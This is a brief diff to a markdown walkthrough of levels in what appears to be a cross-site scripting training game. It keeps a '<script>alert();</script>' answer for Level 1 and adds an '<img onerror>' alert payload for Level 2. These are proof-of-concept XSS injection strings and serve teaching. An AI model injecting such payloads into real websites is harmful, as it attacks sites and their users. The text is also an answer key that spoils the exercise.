@@ -3,9 +3,12 @@
 ## Level 1
 Insert
 `<script>alert();</script>`
-inside the input text box given.
+inside the input text box.
 
 ## Level 2
+Insert
+`<img src="asdgf.png" onerror="javascript:alert();" />`
+inside the input text box.
 
 ## Level 3
 
